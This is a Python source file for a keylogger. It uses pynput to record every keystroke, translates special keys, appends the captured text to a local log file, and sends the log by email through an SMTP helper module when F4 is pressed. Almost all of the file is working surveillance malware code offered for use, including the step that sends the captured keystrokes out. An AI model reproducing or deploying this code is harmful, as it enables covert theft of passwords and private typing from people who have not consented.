# packages
from pynput.keyboard import Listener
import sys
# files project
from smtp import smtp
from validations import validations
from header import header

# cancel script if pressed esc
def cancel():
  exit()

# start keylogger
def write_log(key):
  keydata = str(key)

  args = sys.argv
  values = validations.verify_args(args)

  # manage keys
  if keydata == "Key.esc":
    cancel()
  elif keydata == "Key.f4":
    smtp.send_email(values)

  # translate keys for log file
  translate_keys = {
        "Key.space": " ",
        "Key.backspace": "-1",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.shift": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "",
        "Key.tab": "",
        "_l": ""
  }

  # remove quotes
  keydata = keydata.replace("'", "")

  # replaces with the translated information
  for key in translate_keys:
    keydata = keydata.replace(key, translate_keys[key])

  # create file with log information
  with open("tmp/log.txt", "a") as f:
    f.write(keydata)

# end write_log

# call header
header.header()

# start write log
with Listener(on_press=write_log) as l:
  l.join()